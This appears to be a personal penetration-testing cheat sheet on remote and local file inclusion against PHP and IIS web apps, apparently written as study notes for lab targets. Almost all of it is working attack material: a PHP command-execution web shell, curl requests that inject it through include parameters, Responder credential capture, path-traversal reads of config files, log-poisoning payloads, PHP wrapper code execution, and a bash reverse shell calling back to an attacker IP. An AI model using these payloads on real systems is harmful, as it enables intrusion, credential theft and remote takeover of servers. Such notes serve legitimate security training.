#webapp 


### RFI

#### Catching the creds

```bash
sudo responder -I tun0 -wv
```

```bash
http://192.168.248.165:8080/?url=http://192.168.45.156
```
#### Backdoor Execution

1. Create a backdoor

```
vi simple-backdoor.php
```

```php
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>

#Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
```

2. Inject to the vulnerable parameter

```bash
curl "http://192.168.237.58/image.php?img=http://192.168.45.206/ivan_back.php"
```

OR

```bash
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
```


**Using Apache**
```bash
sudo nano /var/www/html/RFI.txt
```

```bash
systemctl start apache2  
```

**Python Server**

```bash
cd /usr/share/webshells/php
```

```bash
sudo python3 -m http.server 80
```

```bash
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.243/simple-backdoor.php&cmd=cat%20/home/elaine/.ssh/authorized_keys"   
```
### LFI
🔴 If IIS - Replace C: with 5  ..\

```bash
http://192.168.186.220/download?filename=...%5C..%5C..%5C..%5C..%5Cinetpub%5Cwwwroot%5Cappsettings.json
```

```bash
http://192.168.186.220/download?filename=...%5C..%5C..%5C..%5C..%5Cinetpub%5Cwwwroot%5Cweb.config
```


Check with if viewable

```bash
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
```
#### Log file pollusion

1. Enter below command in any parameter injectable

```php
<?php echo system($_GET['cmd']); ?>
```
or
```php
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```
2. Check if its injected
```bash
http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
```
or
```bash
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ps
```

3. Then execute the reverseshell
```bash
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```


**SHell**

[[Shells]]

#### Warappers

**Below test wrapper will display the PHP content in base64**

```bash
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```

**Below wrapper will execute code inside the  PHP  file**

```bash
http://10.11.0.22/menu.php?file=data://text/plain,<?php echo shell_exec("dir");?>
```
🔴 try to url encode the payload if this doesnt work


